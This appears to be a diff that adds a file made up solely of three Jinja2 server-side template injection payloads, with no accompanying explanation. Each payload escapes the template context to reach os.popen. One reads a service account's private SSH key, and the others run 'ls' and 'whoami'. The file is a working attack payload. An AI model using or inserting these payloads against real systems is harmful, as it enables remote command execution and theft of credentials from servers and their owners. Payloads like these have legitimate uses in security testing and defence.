@@ -1,0 +1,12 @@
+
+
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/svc_acc/.ssh/id_rsa').read() }}
+
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('ls').read() }}
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('whoami').read() }}
+
+
+
+
